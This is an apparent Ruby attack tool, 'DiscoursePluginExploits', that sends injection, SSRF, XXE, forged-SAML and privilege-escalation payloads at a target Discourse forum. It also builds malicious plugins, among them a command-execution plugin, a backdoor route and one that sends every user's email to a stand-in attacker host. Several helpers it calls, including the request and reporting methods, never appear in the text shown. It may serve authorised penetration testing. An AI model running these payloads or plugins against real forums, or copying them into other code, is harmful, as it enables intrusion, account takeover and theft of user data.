#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'json'
require 'base64'
require 'digest'
require 'zip'
require 'tempfile'

class DiscoursePluginExploits
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @proxy = options[:proxy]
    @timeout = options[:timeout] || 10
    @session = {}
    @csrf_token = nil
    
    @results = {
      vulnerable: false,
      vulnerabilities: [],
      summary: {
        total_tests: 0,
        successful_tests: 0,
        critical_vulns: 0,
        high_vulns: 0,
        medium_vulns: 0,
        low_vulns: 0
      },
      target: @target_url,
      timestamp: Time.now.iso8601
    }
    
    extract_csrf_token
  end
  
  def run_all_tests
    puts "\nüîç Starting plugin exploit tests on #{@target_url}"
    puts "=" * 60
    
    # Plugin installation and management
    test_plugin_installation
    test_plugin_upload
    test_plugin_configuration
    
    # Plugin-specific vulnerabilities
    test_plugin_xss
    test_plugin_sql_injection
    test_plugin_rce
    test_plugin_ssrf
    
    # Plugin enumeration and disclosure
    test_plugin_enumeration
    test_plugin_source_disclosure
    test_plugin_config_disclosure
    
    # Plugin bypass techniques
    test_plugin_bypass
    test_plugin_privilege_escalation
    
    # Common plugin vulnerabilities
    test_chat_plugin_vulns
    test_oauth_plugin_vulns
    test_ldap_plugin_vulns
    test_saml_plugin_vulns
    test_poll_plugin_vulns
    test_calendar_plugin_vulns
    
    print_results
    save_results
    
    @results
  end
  
  def test_plugin_installation
    puts "\n[*] Testing plugin installation vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # Test malicious plugin installation
    malicious_plugins = [
      create_xss_plugin,
      create_rce_plugin,
      create_backdoor_plugin,
      create_data_exfil_plugin
    ]
    
    malicious_plugins.each_with_index do |plugin_data, index|
      next unless plugin_data
      
      # Test plugin installation via admin interface
      response = test_plugin_install_admin(plugin_data, "malicious_plugin_#{index}")
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Malicious Plugin Installation',
          endpoint: '/admin/plugins',
          method: 'POST',
          payload: { plugin_type: plugin_data[:type] },
          severity: 'Critical',
          evidence: ['Malicious plugin installation successful'],
          description: "Malicious #{plugin_data[:type]} plugin installed successfully"
        })
      end
      
      # Test plugin installation via Git URL
      git_urls = [
        'https://github.com/malicious/discourse-exploit.git',
        'git://malicious.com/exploit.git',
        'file:///etc/passwd',
        'ftp://malicious.com/exploit.git'
      ]
      
      git_urls.each do |git_url|
        response = test_plugin_install_git(git_url)
        
        if response && response.code.to_i < 400
          add_vulnerability({
            test_type: 'Plugin Git Installation',
            endpoint: '/admin/plugins/install',
            method: 'POST',
            payload: { git_url: git_url },
            severity: 'High',
            evidence: ['Git plugin installation successful'],
            description: "Plugin installation via Git URL: #{git_url}"
          })
        end
      end
    end
  end
  
  def test_plugin_upload
    puts "\n[*] Testing plugin upload vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # Test malicious plugin uploads
    upload_tests = [
      { type: 'zip_bomb', file: create_zip_bomb },
      { type: 'path_traversal', file: create_path_traversal_plugin },
      { type: 'executable', file: create_executable_plugin },
      { type: 'oversized', file: create_oversized_plugin }
    ]
    
    upload_tests.each do |test|
      next unless test[:file]
      
      response = test_plugin_file_upload(test[:file], test[:type])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Malicious Plugin Upload',
          endpoint: '/admin/plugins/upload',
          method: 'POST',
          payload: { upload_type: test[:type] },
          severity: 'High',
          evidence: ['Malicious plugin upload successful'],
          description: "Malicious #{test[:type]} plugin upload successful"
        })
      end
    end
  end
  
  def test_plugin_configuration
    puts "\n[*] Testing plugin configuration vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # Test plugin configuration manipulation
    config_tests = [
      { setting: 'plugin_enabled', value: 'true' },
      { setting: 'plugin_admin_only', value: 'false' },
      { setting: 'plugin_trust_level', value: '0' },
      { setting: 'plugin_api_key', value: 'malicious_key' },
      { setting: 'plugin_webhook_url', value: 'http://malicious.com/webhook' },
      { setting: 'plugin_database_url', value: 'postgresql://malicious.com/db' }
    ]
    
    config_tests.each do |test|
      response = test_plugin_config_update(test[:setting], test[:value])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Plugin Configuration Manipulation',
          endpoint: '/admin/site_settings',
          method: 'PUT',
          payload: test,
          severity: 'Medium',
          evidence: ['Plugin configuration updated'],
          description: "Plugin setting #{test[:setting]} modified"
        })
      end
    end
  end
  
  def test_plugin_xss
    puts "\n[*] Testing plugin XSS vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # Test XSS in plugin endpoints
    xss_payloads = [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      "'><script>alert('XSS')</script>",
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>'
    ]
    
    # Common plugin endpoints
    plugin_endpoints = [
      '/chat',
      '/poll',
      '/calendar',
      '/checklist',
      '/voting',
      '/events',
      '/gallery',
      '/wiki',
      '/kanban',
      '/assign'
    ]
    
    plugin_endpoints.each do |endpoint|
      xss_payloads.each do |payload|
        # Test GET parameter XSS
        response = test_plugin_xss_get(endpoint, payload)
        
        if response && check_xss_reflection(response.body, payload)
          add_vulnerability({
            test_type: 'Plugin XSS (GET)',
            endpoint: endpoint,
            method: 'GET',
            payload: { xss: payload },
            severity: 'High',
            evidence: ['XSS payload reflected'],
            description: "XSS vulnerability in plugin endpoint: #{endpoint}"
          })
        end
        
        # Test POST parameter XSS
        response = test_plugin_xss_post(endpoint, payload)
        
        if response && check_xss_reflection(response.body, payload)
          add_vulnerability({
            test_type: 'Plugin XSS (POST)',
            endpoint: endpoint,
            method: 'POST',
            payload: { xss: payload },
            severity: 'High',
            evidence: ['XSS payload reflected'],
            description: "XSS vulnerability in plugin endpoint: #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_plugin_sql_injection
    puts "\n[*] Testing plugin SQL injection vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # SQL injection payloads
    sqli_payloads = [
      "' OR '1'='1",
      "' UNION SELECT 1,2,3--",
      "'; DROP TABLE users;--",
      "' AND (SELECT COUNT(*) FROM users) > 0--",
      "' OR SLEEP(5)--",
      "' OR pg_sleep(5)--",
      "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
    ]
    
    # Plugin endpoints that might be vulnerable to SQLi
    plugin_sqli_endpoints = [
      { endpoint: '/chat/messages', param: 'channel_id' },
      { endpoint: '/poll/votes', param: 'poll_id' },
      { endpoint: '/calendar/events', param: 'event_id' },
      { endpoint: '/assign/assignments', param: 'user_id' },
      { endpoint: '/voting/polls', param: 'topic_id' },
      { endpoint: '/checklist/items', param: 'post_id' }
    ]
    
    plugin_sqli_endpoints.each do |test|
      sqli_payloads.each do |payload|
        response = test_plugin_sqli(test[:endpoint], test[:param], payload)
        
        if response && check_sqli_indicators(response)
          add_vulnerability({
            test_type: 'Plugin SQL Injection',
            endpoint: test[:endpoint],
            method: 'GET',
            payload: { test[:param] => payload },
            severity: 'Critical',
            evidence: ['SQL injection indicators found'],
            description: "SQL injection in plugin endpoint: #{test[:endpoint]}"
          })
        end
      end
    end
  end
  
  def test_plugin_rce
    puts "\n[*] Testing plugin RCE vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # RCE payloads
    rce_payloads = [
      'system("id")',
      '`id`',
      '$(id)',
      '; id',
      '| id',
      '&& id',
      'eval("system(\'id\')")',
      '__import__("os").system("id")',
      'Runtime.getRuntime().exec("id")'
    ]
    
    # Plugin endpoints that might allow RCE
    plugin_rce_endpoints = [
      '/admin/plugins/install',
      '/admin/plugins/update',
      '/admin/plugins/configure',
      '/chat/webhooks',
      '/poll/export',
      '/calendar/import',
      '/assign/bulk_assign'
    ]
    
    plugin_rce_endpoints.each do |endpoint|
      rce_payloads.each do |payload|
        response = test_plugin_rce_payload(endpoint, payload)
        
        if response && check_rce_indicators(response)
          add_vulnerability({
            test_type: 'Plugin RCE',
            endpoint: endpoint,
            method: 'POST',
            payload: { command: payload },
            severity: 'Critical',
            evidence: ['RCE indicators found'],
            description: "RCE vulnerability in plugin endpoint: #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_plugin_ssrf
    puts "\n[*] Testing plugin SSRF vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # SSRF payloads
    ssrf_payloads = [
      'http://127.0.0.1:22',
      'http://localhost:3000',
      'http://169.254.169.254/latest/meta-data/',
      'file:///etc/passwd',
      'gopher://127.0.0.1:6379/_INFO',
      'dict://127.0.0.1:11211/stats',
      'ldap://127.0.0.1:389/'
    ]
    
    # Plugin endpoints that might be vulnerable to SSRF
    plugin_ssrf_endpoints = [
      { endpoint: '/chat/webhooks', param: 'webhook_url' },
      { endpoint: '/poll/import', param: 'import_url' },
      { endpoint: '/calendar/subscribe', param: 'calendar_url' },
      { endpoint: '/gallery/import', param: 'image_url' },
      { endpoint: '/wiki/import', param: 'wiki_url' }
    ]
    
    plugin_ssrf_endpoints.each do |test|
      ssrf_payloads.each do |payload|
        response = test_plugin_ssrf_payload(test[:endpoint], test[:param], payload)
        
        if response && check_ssrf_indicators(response)
          add_vulnerability({
            test_type: 'Plugin SSRF',
            endpoint: test[:endpoint],
            method: 'POST',
            payload: { test[:param] => payload },
            severity: 'High',
            evidence: ['SSRF indicators found'],
            description: "SSRF vulnerability in plugin endpoint: #{test[:endpoint]}"
          })
        end
      end
    end
  end
  
  def test_plugin_enumeration
    puts "\n[*] Testing plugin enumeration..."
    @results[:summary][:total_tests] += 1
    
    # Plugin enumeration endpoints
    enum_endpoints = [
      '/admin/plugins.json',
      '/admin/plugins',
      '/plugins.json',
      '/site.json',
      '/about.json'
    ]
    
    enum_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        plugins = extract_plugin_info(response.body)
        
        if plugins.any?
          add_vulnerability({
            test_type: 'Plugin Enumeration',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: 'Low',
            evidence: plugins,
            description: "#{plugins.length} plugins enumerated"
          })
        end
      end
    end
    
    # Test common plugin paths
    common_plugins = [
      'discourse-chat',
      'discourse-poll',
      'discourse-calendar',
      'discourse-checklist',
      'discourse-voting',
      'discourse-assign',
      'discourse-oauth2-basic',
      'discourse-ldap-auth',
      'discourse-saml',
      'discourse-akismet',
      'discourse-math',
      'discourse-spoiler-alert'
    ]
    
    common_plugins.each do |plugin|
      response = make_request(URI("#{@target_url}/plugins/#{plugin}"), 'GET')
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Plugin Path Disclosure',
          endpoint: "/plugins/#{plugin}",
          method: 'GET',
          payload: {},
          severity: 'Low',
          evidence: ['Plugin path accessible'],
          description: "Plugin path accessible: #{plugin}"
        })
      end
    end
  end
  
  def test_plugin_source_disclosure
    puts "\n[*] Testing plugin source code disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Plugin source paths
    source_paths = [
      '/plugins/',
      '/assets/plugins/',
      '/javascripts/plugins/',
      '/stylesheets/plugins/',
      '/templates/plugins/'
    ]
    
    source_paths.each do |path|
      response = make_request(URI("#{@target_url}#{path}"), 'GET')
      
      if response && (response.code.to_i < 400 || response.code.to_i == 403)
        if check_source_disclosure(response)
          add_vulnerability({
            test_type: 'Plugin Source Disclosure',
            endpoint: path,
            method: 'GET',
            payload: {},
            severity: 'Medium',
            evidence: ['Plugin source code accessible'],
            description: "Plugin source code accessible: #{path}"
          })
        end
      end
    end
  end
  
  def test_plugin_config_disclosure
    puts "\n[*] Testing plugin configuration disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Plugin config endpoints
    config_endpoints = [
      '/admin/site_settings.json?filter=plugin',
      '/admin/plugins/settings.json',
      '/site.json'
    ]
    
    config_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        config_data = extract_plugin_config(response.body)
        
        if config_data.any?
          add_vulnerability({
            test_type: 'Plugin Configuration Disclosure',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: 'Medium',
            evidence: config_data,
            description: "Plugin configuration disclosed: #{config_data.length} settings"
          })
        end
      end
    end
  end
  
  def test_plugin_bypass
    puts "\n[*] Testing plugin security bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test plugin permission bypass
    bypass_tests = [
      { endpoint: '/admin/plugins', headers: { 'X-Plugin-Admin' => 'true' } },
      { endpoint: '/admin/plugins', headers: { 'X-Bypass-Auth' => 'true' } },
      { endpoint: '/admin/plugins', headers: { 'X-Plugin-Override' => 'admin' } },
      { endpoint: '/chat/admin', headers: { 'X-Chat-Admin' => 'true' } },
      { endpoint: '/poll/admin', headers: { 'X-Poll-Admin' => 'true' } }
    ]
    
    bypass_tests.each do |test|
      response = make_request_with_headers("#{@target_url}#{test[:endpoint]}", 'GET', test[:headers])
      
      if response && response.code.to_i < 400 && !response.body.include?('login')
        add_vulnerability({
          test_type: 'Plugin Security Bypass',
          endpoint: test[:endpoint],
          method: 'GET',
          payload: test[:headers],
          severity: 'High',
          evidence: ['Plugin security bypass successful'],
          description: "Plugin security bypass: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_plugin_privilege_escalation
    puts "\n[*] Testing plugin privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test privilege escalation via plugins
    escalation_tests = [
      { endpoint: '/chat/admin/promote', data: { user_id: 1 } },
      { endpoint: '/assign/admin/grant', data: { user_id: 1, role: 'admin' } },
      { endpoint: '/voting/admin/permissions', data: { user_id: 1, level: 'admin' } },
      { endpoint: '/poll/admin/moderator', data: { user_id: 1 } }
    ]
    
    escalation_tests.each do |test|
      response = make_post_request("#{@target_url}#{test[:endpoint]}", test[:data])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Plugin Privilege Escalation',
          endpoint: test[:endpoint],
          method: 'POST',
          payload: test[:data],
          severity: 'Critical',
          evidence: ['Privilege escalation successful'],
          description: "Privilege escalation via plugin: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_chat_plugin_vulns
    puts "\n[*] Testing chat plugin vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # Chat-specific vulnerabilities
    chat_tests = [
      { type: 'message_xss', endpoint: '/chat/messages', data: { message: '<script>alert("XSS")</script>' } },
      { type: 'channel_sqli', endpoint: '/chat/channels', param: 'id', payload: "1' OR '1'='1" },
      { type: 'webhook_ssrf', endpoint: '/chat/webhooks', data: { url: 'http://127.0.0.1:22' } },
      { type: 'file_upload', endpoint: '/chat/upload', data: { file: 'malicious.php' } }
    ]
    
    chat_tests.each do |test|
      response = case test[:type]
      when 'message_xss', 'webhook_ssrf', 'file_upload'
        make_post_request("#{@target_url}#{test[:endpoint]}", test[:data])
      when 'channel_sqli'
        make_request(URI("#{@target_url}#{test[:endpoint]}?#{test[:param]}=#{test[:payload]}"), 'GET')
      end
      
      if response && check_vulnerability_indicators(response, test[:type])
        add_vulnerability({
          test_type: "Chat Plugin #{test[:type].upcase}",
          endpoint: test[:endpoint],
          method: test[:type] == 'channel_sqli' ? 'GET' : 'POST',
          payload: test[:data] || { test[:param] => test[:payload] },
          severity: determine_severity(test[:type]),
          evidence: ['Chat plugin vulnerability found'],
          description: "Chat plugin #{test[:type]} vulnerability"
        })
      end
    end
  end
  
  def test_oauth_plugin_vulns
    puts "\n[*] Testing OAuth plugin vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # OAuth-specific vulnerabilities
    oauth_tests = [
      { type: 'redirect_uri', endpoint: '/auth/oauth2_basic/callback', param: 'redirect_uri', payload: 'http://malicious.com' },
      { type: 'state_bypass', endpoint: '/auth/oauth2_basic/callback', param: 'state', payload: 'bypassed' },
      { type: 'code_reuse', endpoint: '/auth/oauth2_basic/callback', param: 'code', payload: 'reused_code' },
      { type: 'client_secret', endpoint: '/admin/plugins/oauth2_basic', data: { client_secret: 'exposed' } }
    ]
    
    oauth_tests.each do |test|
      response = case test[:type]
      when 'client_secret'
        make_post_request("#{@target_url}#{test[:endpoint]}", test[:data])
      else
        make_request(URI("#{@target_url}#{test[:endpoint]}?#{test[:param]}=#{test[:payload]}"), 'GET')
      end
      
      if response && check_oauth_vulnerability(response, test[:type])
        add_vulnerability({
          test_type: "OAuth Plugin #{test[:type].upcase}",
          endpoint: test[:endpoint],
          method: test[:type] == 'client_secret' ? 'POST' : 'GET',
          payload: test[:data] || { test[:param] => test[:payload] },
          severity: 'High',
          evidence: ['OAuth plugin vulnerability found'],
          description: "OAuth plugin #{test[:type]} vulnerability"
        })
      end
    end
  end
  
  def test_ldap_plugin_vulns
    puts "\n[*] Testing LDAP plugin vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # LDAP-specific vulnerabilities
    ldap_tests = [
      { type: 'injection', endpoint: '/auth/ldap', data: { username: 'admin)(|(password=*))', password: 'any' } },
      { type: 'blind_injection', endpoint: '/auth/ldap', data: { username: 'admin*', password: 'any' } },
      { type: 'info_disclosure', endpoint: '/admin/plugins/ldap-auth', data: {} }
    ]
    
    ldap_tests.each do |test|
      response = make_post_request("#{@target_url}#{test[:endpoint]}", test[:data])
      
      if response && check_ldap_vulnerability(response, test[:type])
        add_vulnerability({
          test_type: "LDAP Plugin #{test[:type].upcase}",
          endpoint: test[:endpoint],
          method: 'POST',
          payload: test[:data],
          severity: 'High',
          evidence: ['LDAP plugin vulnerability found'],
          description: "LDAP plugin #{test[:type]} vulnerability"
        })
      end
    end
  end
  
  def test_saml_plugin_vulns
    puts "\n[*] Testing SAML plugin vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # SAML-specific vulnerabilities
    saml_tests = [
      { type: 'xml_injection', endpoint: '/auth/saml/callback', data: { SAMLResponse: create_malicious_saml } },
      { type: 'signature_bypass', endpoint: '/auth/saml/callback', data: { SAMLResponse: create_unsigned_saml } },
      { type: 'xxe', endpoint: '/auth/saml/metadata', data: { xml: create_xxe_payload } }
    ]
    
    saml_tests.each do |test|
      response = make_post_request("#{@target_url}#{test[:endpoint]}", test[:data])
      
      if response && check_saml_vulnerability(response, test[:type])
        add_vulnerability({
          test_type: "SAML Plugin #{test[:type].upcase}",
          endpoint: test[:endpoint],
          method: 'POST',
          payload: { saml_type: test[:type] },
          severity: 'Critical',
          evidence: ['SAML plugin vulnerability found'],
          description: "SAML plugin #{test[:type]} vulnerability"
        })
      end
    end
  end
  
  def test_poll_plugin_vulns
    puts "\n[*] Testing poll plugin vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # Poll-specific vulnerabilities
    poll_tests = [
      { type: 'vote_manipulation', endpoint: '/polls/vote', data: { poll_id: 1, option_id: 1, votes: 1000 } },
      { type: 'poll_creation', endpoint: '/polls', data: { title: '<script>alert("XSS")</script>' } },
      { type: 'results_disclosure', endpoint: '/polls/1/results', data: {} }
    ]
    
    poll_tests.each do |test|
      response = make_post_request("#{@target_url}#{test[:endpoint]}", test[:data])
      
      if response && check_poll_vulnerability(response, test[:type])
        add_vulnerability({
          test_type: "Poll Plugin #{test[:type].upcase}",
          endpoint: test[:endpoint],
          method: 'POST',
          payload: test[:data],
          severity: 'Medium',
          evidence: ['Poll plugin vulnerability found'],
          description: "Poll plugin #{test[:type]} vulnerability"
        })
      end
    end
  end
  
  def test_calendar_plugin_vulns
    puts "\n[*] Testing calendar plugin vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # Calendar-specific vulnerabilities
    calendar_tests = [
      { type: 'event_xss', endpoint: '/calendar/events', data: { title: '<script>alert("XSS")</script>' } },
      { type: 'ical_injection', endpoint: '/calendar/import', data: { ical_url: 'http://malicious.com/evil.ics' } },
      { type: 'timezone_bypass', endpoint: '/calendar/events', data: { timezone: '../../../etc/passwd' } }
    ]
    
    calendar_tests.each do |test|
      response = make_post_request("#{@target_url}#{test[:endpoint]}", test[:data])
      
      if response && check_calendar_vulnerability(response, test[:type])
        add_vulnerability({
          test_type: "Calendar Plugin #{test[:type].upcase}",
          endpoint: test[:endpoint],
          method: 'POST',
          payload: test[:data],
          severity: 'Medium',
          evidence: ['Calendar plugin vulnerability found'],
          description: "Calendar plugin #{test[:type]} vulnerability"
        })
      end
    end
  end
  
  # Helper methods for creating malicious plugins
  def create_xss_plugin
    {
      type: 'XSS',
      name: 'discourse-xss-test',
      content: {
        'plugin.rb' => 'register_asset "javascripts/xss.js"',
        'assets/javascripts/xss.js' => 'alert("XSS via Plugin");'
      }
    }
  end
  
  def create_rce_plugin
    {
      type: 'RCE',
      name: 'discourse-rce-test',
      content: {
        'plugin.rb' => 'system("id > /tmp/rce_test")',
        'lib/rce.rb' => '`whoami > /tmp/rce_user`'
      }
    }
  end
  
  def create_backdoor_plugin
    {
      type: 'Backdoor',
      name: 'discourse-backdoor-test',
      content: {
        'plugin.rb' => 'add_admin_route "backdoor", "backdoor"',
        'config/routes.rb' => 'get "/backdoor" => "backdoor#index"',
        'app/controllers/backdoor_controller.rb' => 'class BackdoorController < ApplicationController; def index; render json: { admin: true }; end; end'
      }
    }
  end
  
  def create_data_exfil_plugin
    {
      type: 'Data Exfiltration',
      name: 'discourse-exfil-test',
      content: {
        'plugin.rb' => 'after_initialize { User.all.each { |u| Net::HTTP.get(URI("http://malicious.com/steal?data=#{u.email}")) } }'
      }
    }
  end
  
  def create_zip_bomb
    # Create a simple zip bomb
    Tempfile.new(['zipbomb', '.zip']).tap do |file|
      Zip::File.open(file.path, Zip::File::CREATE) do |zip|
        # Add a large file
        zip.get_output_stream('bomb.txt') do |stream|
          1000.times { stream.write('A' * 1000) }
        end
      end
    end
  rescue
    nil
  end
  
  def create_path_traversal_plugin
    Tempfile.new(['traversal', '.zip']).tap do |file|
      Zip::File.open(file.path, Zip::File::CREATE) do |zip|
        zip.get_output_stream('../../../etc/passwd') do |stream|
          stream.write('malicious content')
        end
      end
    end
  rescue
    nil
  end
  
  def create_executable_plugin
    Tempfile.new(['executable', '.zip']).tap do |file|
      Zip::File.open(file.path, Zip::File::CREATE) do |zip|
        zip.get_output_stream('malicious.exe') do |stream|
          stream.write('MZ' + 'A' * 100)  # Simple PE header
        end
      end
    end
  rescue
    nil
  end
  
  def create_oversized_plugin
    Tempfile.new(['oversized', '.zip']).tap do |file|
      Zip::File.open(file.path, Zip::File::CREATE) do |zip|
        zip.get_output_stream('large.txt') do |stream|
          10000.times { stream.write('A' * 1000) }  # 10MB file
        end
      end
    end
  rescue
    nil
  end
  
  def create_malicious_saml
    Base64.encode64(<<~XML)
      <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
        <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
          <saml:Subject>
            <saml:NameID>admin@malicious.com</saml:NameID>
          </saml:Subject>
          <saml:AttributeStatement>
            <saml:Attribute Name="admin">
              <saml:AttributeValue>true</saml:AttributeValue>
            </saml:Attribute>
          </saml:AttributeStatement>
        </saml:Assertion>
      </samlp:Response>
    XML
  end
  
  def create_unsigned_saml
    Base64.encode64(<<~XML)
      <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
        <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
          <saml:Subject>
            <saml:NameID>admin@example.com</saml:NameID>
          </saml:Subject>
        </saml:Assertion>
      </samlp:Response>
    XML
  end
  
  def create_xxe_payload
    <<~XML
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <root>&xxe;</root>
    XML
  end
  
  # Helper methods for testing
  def test_plugin_install_admin(plugin_data, name)
    data = {
      plugin_name: name,
      plugin_content: plugin_data[:content].to_json
    }
    
    make_post_request("#{@target_url}/admin/plugins/install", data)
  end
  
  def test_plugin_install_git(git_url)
    data = { git_url: git_url }
    make_post_request("#{@target_url}/admin/plugins/install", data)
  end
  
  def test_plugin_file_upload(file, type)
    return nil unless file
    
    # Simulate file upload
    data = {
      plugin_file: file.path,
      upload_type: type
    }
    
    make_post_request("#{@target_url}/admin/plugins/upload", data)
  end
  
  def test_plugin_config_update(setting, value)
    data = { setting => value }
    make_request_with_data("/admin/site_settings/#{setting}", 'PUT', data)
  end
  
  def test_plugin_xss_get(endpoint, payload)
    make_request(URI("#{@target_url}#{endpoint}?q=#{CGI.escape(payload)}"), 'GET')
  end
  
  def test_plugin_xss_post(endpoint, payload)
    data = { content: payload, message: payload, title: payload }
    make_post_request("#{@target_url}#{endpoint}", data)
  end
  
  def test_plugin_sqli(endpoint, param, payload)
    make_request(URI("#{@target_url}#{endpoint}?#{param}=#{CGI.escape(payload)}"), 'GET')
  end
  
  def test_plugin_rce_payload(endpoint, payload)
    data = { command: payload, script: payload, code: payload }
    make_post_request("#{@target_url}#{endpoint}", data)
  end
  
  def test_plugin_ssrf_payload(endpoint, param, payload)
    data = { param => payload }
    make_post_request("#{@target_url}#{endpoint}", data)
  end
  
  # Helper methods for checking vulnerabilities
  def check_xss_reflection(body, payload)
    # Remove encoding to check for reflection
    decoded_payload = CGI.unescapeHTML(payload)
    body.include?(payload) || body.include?(decoded_payload)
  end
  
  def check_sqli_indicators(response)
    return false unless response
    
    sqli_indicators = [
      /SQL syntax.*error/i,
      /mysql_fetch_array/i,
      /PostgreSQL.*ERROR/i,
      /Warning.*mysql_/i,
      /valid MySQL result/i,
      /ORA-\d{5}/i,
      /Microsoft.*ODBC.*SQL/i,
      /SQLite.*error/i
    ]
    
    sqli_indicators.any? { |pattern| response.body.match(pattern) }
  end
  
  def check_rce_indicators(response)
    return false unless response
    
    rce_indicators = [
      /uid=\d+.*gid=\d+/,
      /root:.*:0:0:/,
      /bin\/bash/,
      /\$ whoami/,
      /command not found/i,
      /permission denied/i
    ]
    
    rce_indicators.any? { |pattern| response.body.match(pattern) }
  end
  
  def check_ssrf_indicators(response)
    return false unless response
    
    # Check for SSRF success indicators
    ssrf_indicators = [
      /Connection refused/i,
      /Connection timeout/i,
      /No route to host/i,
      /Internal Server Error/i,
      /HTTP\/1\.[01] 200/,
      /SSH-2\.0/,
      /220.*FTP/i
    ]
    
    ssrf_indicators.any? { |pattern| response.body.match(pattern) } ||
    response.code.to_i == 500 || response.code.to_i == 502 || response.code.to_i == 503
  end
  
  def check_vulnerability_indicators(response, vuln_type)
    case vuln_type
    when 'message_xss'
      check_xss_reflection(response.body, '<script>alert("XSS")</script>')
    when 'channel_sqli'
      check_sqli_indicators(response)
    when 'webhook_ssrf'
      check_ssrf_indicators(response)
    when 'file_upload'
      response.code.to_i < 400 && response.body.include?('upload')
    else
      false
    end
  end
  
  def check_oauth_vulnerability(response, vuln_type)
    case vuln_type
    when 'redirect_uri'
      response.code.to_i == 302 && response['Location']&.include?('malicious.com')
    when 'state_bypass'
      response.code.to_i < 400 && !response.body.include?('error')
    when 'code_reuse'
      response.code.to_i < 400 && response.body.include?('access_token')
    when 'client_secret'
      response.body.include?('client_secret') || response.body.include?('secret')
    else
      false
    end
  end
  
  def check_ldap_vulnerability(response, vuln_type)
    case vuln_type
    when 'injection', 'blind_injection'
      response.code.to_i < 400 && !response.body.include?('invalid')
    when 'info_disclosure'
      response.body.include?('ldap') || response.body.include?('directory')
    else
      false
    end
  end
  
  def check_saml_vulnerability(response, vuln_type)
    case vuln_type
    when 'xml_injection', 'signature_bypass'
      response.code.to_i < 400 && response.body.include?('admin')
    when 'xxe'
      response.body.include?('root:') || response.body.include?('/etc/passwd')
    else
      false
    end
  end
  
  def check_poll_vulnerability(response, vuln_type)
    case vuln_type
    when 'vote_manipulation'
      response.code.to_i < 400 && response.body.include?('vote')
    when 'poll_creation'
      check_xss_reflection(response.body, '<script>alert("XSS")</script>')
    when 'results_disclosure'
      response.code.to_i < 400 && response.body.include?('results')
    else
      false
    end
  end
  
  def check_calendar_vulnerability(response, vuln_type)
    case vuln_type
    when 'event_xss'
      check_xss_reflection(response.body, '<script>alert("XSS")</script>')
    when 'ical_injection'
      check_ssrf_indicators(response)
    when 'timezone_bypass'
      response.body.include?('root:') || response.body.include?('/etc/passwd')
    else
      false
    end
  end
  
  def check_source_disclosure(response)
    return false unless response
    
    source_indicators = [
      /class.*Controller/i,
      /def.*index/i,
      /require.*rails/i,
      /gem.*['"].*['"]/i,
      /plugin\.rb/i,
      /discourse.*plugin/i
    ]
    
    source_indicators.any? { |pattern| response.body.match(pattern) }
  end
  
  def extract_plugin_info(body)
    plugins = []
    
    begin
      if body.include?('{') && body.include?('}')
        data = JSON.parse(body)
        
        if data['plugins'] && data['plugins'].is_a?(Array)
          data['plugins'].each do |plugin|
            plugins << plugin['name'] if plugin['name']
          end
        end
      end
    rescue JSON::ParserError
      # Extract plugin names from HTML
      plugin_pattern = /plugin["']?\s*[:=]\s*["']([^"']+)["']/i
      body.scan(plugin_pattern) do |match|
        plugins << match[0]
      end
    end
    
    plugins.uniq
  end
  
  def extract_plugin_config(body)
    config_data = []
    
    begin
      if body.include?('{') && body.include?('}')
        data = JSON.parse(body)
        
        if data['site_settings'] && data['site_settings'].is_a?(Array)
          plugin_settings = data['site_settings'].select { |s| s['setting']&.include?('plugin') }
          plugin_settings.each do |setting|
            config_data << "#{setting['setting']}: #{setting['value']}"
          end
        end
      end
    rescue JSON::ParserError
      # Extract plugin config from HTML
      config_pattern = /plugin.*["']([^"']+)["'].*["']([^"']+)["']/i
      body.scan(config_pattern) do |match|
        config_data << "#{match[0]}: #{match[1]}"
      end
    end
    
    config_data
  end
  
  def determine_severity(vuln_type)
    case vuln_type
    when 'message_xss', 'webhook_ssrf'
      'High'
    when 'channel_sqli'
      'Critical'
    when 'file_upload'
      'Medium'
    else
      'Medium'
    end
  end
  
